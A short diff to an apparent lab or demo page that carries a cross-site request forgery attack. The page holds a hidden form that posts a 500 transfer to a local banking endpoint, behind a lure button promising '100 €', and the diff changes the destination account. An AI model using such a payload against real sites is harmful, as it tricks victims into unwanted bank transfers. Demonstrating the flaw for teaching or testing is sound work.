@@ -5,7 +5,7 @@
 
 		<!-- Formulaire CSRF -->
 		<form action="http://localhost:8080/bank/transfer" method="POST">
-			<input type="hidden" name="toAccountNumber" value="FR5678" />
+			<input type="hidden" name="toAccountNumber" value="FR1234" />
 			<input type="hidden" name="amount" value="500" />
 			<button type="submit">Click here to get 100 €</button>
 		</form>
